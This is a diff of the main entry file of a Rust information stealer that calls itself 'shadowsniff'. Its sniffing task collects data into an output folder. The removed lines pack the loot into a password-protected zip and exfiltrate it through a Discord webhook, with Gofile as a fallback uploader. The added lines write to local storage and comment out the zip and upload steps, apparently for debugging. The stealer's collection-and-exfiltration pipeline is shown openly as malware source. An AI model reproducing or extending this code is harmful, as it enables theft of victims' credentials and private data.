@@ -7,26 +7,18 @@
 extern crate alloc;
 
 use alloc::format;
-use alloc::string::String;
-use alloc::sync::Arc;
-use alloc::vec::Vec;
 use collector::atomic::AtomicCollector;
 use collector::DisplayCollector;
 use filesystem::path::Path;
-use filesystem::virtualfs::VirtualFileSystem;
-use filesystem::FileSystem;
+use filesystem::storage::StorageFileSystem;
+use filesystem::{FileSystem, FileSystemExt};
 use ipinfo::init_ip_info;
-use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
-use sender::discord_webhook::DiscordWebhook;
-use sender::gofile::Gofile;
-use sender::size_fallback::SizeFallbackLogFile;
 use sender::LogSender;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
 use utils::random::ChaCha20RngExt;
-use zip::{ZipArchive, ZipCompression};
 
 mod panic;
 
@@ -40,49 +32,41 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
         panic!()
     }
 
-    let fs = VirtualFileSystem::default();
-    let out = Path::new("\\output");
-    // let _ = fs.remove_dir_all(out);
-    let _ = fs.mkdir(&out);
+    let fs = StorageFileSystem;
+    let out = &Path::new("output");
+    let _ = fs.remove_dir_all(out);
+    let _ = fs.mkdir(out);
 
     let collector = AtomicCollector::default();
 
     unsafe {
-        SniffTask::default().run(&out, &fs, &collector);
+        SniffTask::default().run(out, &fs, &collector);
     }
 
     let displayed_collector = format!("{}", DisplayCollector(&collector));
 
     log_debug!("{displayed_collector}");
 
-    let password: String = {
-        let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
-        let mut rng = ChaCha20Rng::from_nano_time();
+    // let _password: String = {
+    //     let charset: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
+    //     let mut rng = ChaCha20Rng::from_nano_time();
+    //
+    //     (0..10)
+    //         .map(|_| {
+    //             let idx = (rng.next_u32() as usize) % charset.len();
+    //             charset[idx]
+    //         })
+    //         .collect()
+    // };
 
-        (0..10)
-            .map(|_| {
-                let idx = (rng.next_u32() as usize) % charset.len();
-                charset[idx]
-            })
-            .collect()
-    };
-
-    let zip = ZipArchive::default()
-        .add_folder_content(&fs, out)
-        .password(&password)
-        .compression(ZipCompression::NONE)
-        .comment(displayed_collector)
-        .create();
-
+    // let zip = ZipArchive::default()
+    //     .add_folder_content(&fs, out)
+    //     .password("shadowsniff")
+    //     .comment(displayed_collector)
+    //     .create();
+    //
     // let out = Path::new("output.zip");
     // let _ = StorageFileSystem.write_file(&out, &zip);
-
-    let discord = DiscordWebhook::new(Arc::from(env!("DISCORD_WEBHOOK")));
-    let gofile = Gofile::new(discord.clone());
-
-    SizeFallbackLogFile::new(discord, gofile)
-        .send(zip.into(), Some(password), &collector)
-        .unwrap();
 
     0
 }
